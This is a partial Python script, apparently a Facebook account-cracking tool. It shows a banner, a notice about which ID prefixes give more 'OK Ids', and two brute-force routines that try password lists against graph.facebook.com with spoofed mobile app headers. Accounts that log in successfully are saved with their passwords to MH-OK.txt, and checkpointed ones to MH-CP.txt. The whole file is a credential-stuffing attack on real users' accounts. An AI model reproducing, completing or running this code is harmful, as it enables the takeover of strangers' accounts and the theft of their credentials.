...
.|       _.-"", /          ..~"                  ""~~~"    ""~~~~~  :>
           ...
           .~"  "~.         "-~~....--""__________,,....~~~~"""
                  ...
                  |
\033[1;93m=================================
\033[1;97m Owner  : XXXXXX 
\033[1;97m GitHub : XXXXXX 
\033[1;97m Version:\033[1;92m 0.1 \033[1;97m
\033[1;97m Status : PERSONAL 
\033[1;97m Notice : Use 100089/100090 For More OK Ids 
            SPECIAL THANKSðŸ˜˜ðŸ˜˜ HANNANðŸ˜˜ðŸ˜˜
\033[1;93m=================================
'''
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mMH-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.65 Mobile Safari/537.36"
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mMH-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92mâ€¢\033[1;97m '+pword+'  ')
                open('/sdcard/MH-OK.txt','a').write(f'{acc} â€¢ {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mMH-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91mâ€¢\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/MH-CP.txt','a').write(f'{acc} â€¢ {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mMH-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
